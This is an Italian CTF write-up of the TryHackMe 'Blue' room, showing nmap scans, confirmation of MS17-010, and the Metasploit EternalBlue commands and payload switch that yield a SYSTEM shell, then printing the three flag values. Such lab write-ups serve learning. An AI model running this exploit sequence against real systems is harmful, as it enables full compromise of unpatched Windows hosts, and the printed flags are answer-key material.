---
layout: writeup
lang: it
permalink: /writeups/blue/
title: "Blue"
ref: blue
date: 2026-08-01
bare: true
platform: THM
os: Windows Server 2012 R2 Datacenter
difficulty: Easy
series: thm-windows
tags: [win, smb, MS17-010, metasploit, privesc]
txt: /writeups-files/blue.txt
summary: "EternalBlue su SMB. Il payload reverse_tcp viene bloccato in uscita, bind_tcp apre una shell diretta come SYSTEM."
---

# Writeup — Blue (TryHackMe)

OS: Windows Server 2012 R2 Datacenter
Difficoltà: Easy
Data: 20 agosto 2026

---

## Sommario

Macchina Windows standalone, non in dominio. nmap rivela SMB esposto con una versione vulnerabile a MS17-010 (EternalBlue). essa è stata sfruttata con il modulo Metasploit dedicato e consigliato, con un tentativo iniziale fallito per via del payload "reverse_tcp" bloccato in uscita. passando a un payload "bind_tcp" la shell si apre e arriva direttamente come SYSTEM (privilegi elevati). da lì solo enumerazione manuale del filesystem per recuperare eventuali dati utili (le tre flag della room)

Catena: nmap → SMB vulnerabile a MS17-010 → Metasploit EternalBlue → payload bind_tcp → shell SYSTEM → esplorazione filesystem →  flag su C:, System32\config e Users\Jon\Documents.

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

---

## Premessa

room fatta su una macchina AttackBox fornita da TryHackMe, non sulla mia locale. diversi tool già disponibili in /root/Desktop/Tools e /opt/, wordlist in /usr/share/wordlists, e sull'attackbox erano già presenti bloodhound, metasploit, postman, caido, exploitdb e ghidra tra gli altri. 
Room pensata e descritta dall'introduzione come primo contatto con EternalBlue e completata in circa un'ora di lavoro 
la parte tecnica non è stata onerosa, il tempo perso è stato sul primo tentativo di exploit tramite metasploit fallito e sulla ricerca del comando giusto per leggere il contenuto di un file da shell Windows,dato che non lo ricordavo e non è Linux dove si risolve con un semplice grep.

---

## Fase 1 — Ricognizione

primo scan con script e version, non risponde:

nmap -Pn -sC -sV -T4 10.114.166.198

ICMP disabilitato, da qui il -Pn in ogni scan successivo.
provo con range di porte più ampio:

nmap -Pn -T4 --top-ports 1000 10.114.166.198

Risultato:

135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
3389/tcp open ms-wbt-server
49152-49155/tcp open unknown

SMB e RDP esposti, nessun dominio (niente 389/88 quindi è  macchina standalone). 
con 445 aperto la prima cosa sensata è controllare il MS17-010, ricercato online dopo averlo letto nell'introduzione alla room prima di iniziare:

nmap -Pn -p445 --script smb-os-discovery,smb-vuln-ms17-010 10.114.166.198
stiamo dicendo a nmap di eseguire due script NSE precisi che contiene dentro sé= 
smb-os-discovery interroga SMB e prova a ricavare OS, hostname, dominio, versione Windows che possono tornarci molto utili visto che andrà usato Metasploit (soprattutto la versione).
smb-vuln-ms17-010 verifica solo se SMB è vulnerabile a MS17-010 (EternalBlue)
nmap ha centinaia di script già pronti in /usr/share/nmap/scripts/ proprio come questi

Output conferma:

VULNERABLE: MS17-010, CVE-2017-0143
OS: Windows Server 2012 R2 Datacenter 9600
Computer name: WIN-JO6REVNMMMP

target confermato EternalBlue.

---

## Fase 2 — Exploitation 

Metasploit già installato nella macchina,cerco il modulo:

Sequenza di comandi:
msfconsole (aperto poi manualmente da shortcut su Desktop, comando runnava all'infinito)
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.114.166.198
show options

nessun parametro obbligatorio mancante ad occhio. confermato anche facendo leggere l'output di show options al chatbot. primo tentativo con il payload di default (reverse_tcp):

run

il check preliminare conferma la vulnerabilità, exploit inizia ma il modulo si ferma su:

Exploit failed with the following error: Read timeout expired when reading from the Socket (timeout=30)
Exploit completed, but no session was created.

comprendo che non c'è nessuna sessione creata. può essere un probabile firewall in uscita sulla macchina target, ma ho poca conoscenza riguardo le altre cause. 

dopo questo tentativo fallito, quello che ha funzionato è stato rilevato dal chatbot, giustificabile perchè la room lo diceva già: nelle istruzioni del "Task2" c'era scritto di impostare set payload windows/x64/shell/reverse_tcp prima di lanciare l'exploit, "for the sake of learning". non l'avevo letto, dato che stavo lavorando quasi interamente in autonomia nella macchina.
Quindi:

set PAYLOAD windows/x64/shell_bind_tcp
set LPORT 4444
exploit

questa volta il check è identico ma la sessione si apre:

Command shell session 1 opened (10.114.130.193:44197 -> 10.114.166.198:4444)

shell come:

C:\Windows\system32>whoami
nt authority\system

SYSTEM diretto senza nessun passaggio intermedio di privilege escalation .

---

## Fase 3 — Enumerazione e recupero delle flag

utenti presenti sulla macchina:

dir C:\Users

Administrator, Jon, Public. parto da Jon:

dir C:\Users\Jon\Documents

Directory of C:\Users\Jon\Documents
....
07/31/2026 01:29 PM 37 flag3.txt

type C:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}

prima flag trovata. Administrator\Desktop e Administrator\Documents risultano praticamente vuoti, e rimanendo poco tempo rimanente nella macchina Free cerco direttamente per nome file direttamente dalla radice visto che posso muovermi ovunque nel filesystem:

dir C:\flag*.txt   (equivalente di un grep in Linux)

Directory of C:\
07/31/2026 01:24 PM 24 flag1.txt

type C:\flag1.txt
flag{access_the_machine}

resta una terza flag non ancora trovata, ipotizzo legata al database SAM viste le indicazioni della room su NTLM e hash che ho letto in questa fase per avere del contesto. ma fortunatamente è bastato cercare di nuovo ricorsivamente in tutto il filesystem:

dir /s C:\flag2.txt

Directory of C:\Windows\System32\config   (percorso in cui era la flag)
07/31/2026 01:26 PM 34 flag2.txt

type C:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}

tutte e tre le flag recuperate.

---

## Catena completa

nmap top-ports → SMB e RDP esposti
→ smb-vuln-ms17-010 conferma CVE-2017-0143
→ Metasploit exploit/windows/smb/ms17_010_eternalblue
→ payload reverse_tcp fallisce (timeout)
→ payload shell_bind_tcp funziona
→ shell diretta come nt authority\system
→ enumerazione manuale filesystem → 3 flag recuperate

---

## Lezioni apprese

leggere le istruzioni della room prima di lanciare qualcosa, anche quando sembrano scontate. in questo caso il suggerimento sul cambio di payload c'era già scritto e l'ho trovato da un'altra parte solo dopo aver perso tempo a cercarlo altrove.

---

## Tool utilizzati

nmap, msfconsole/metasploit (exploit/windows/smb/ms17_010_eternalblue)
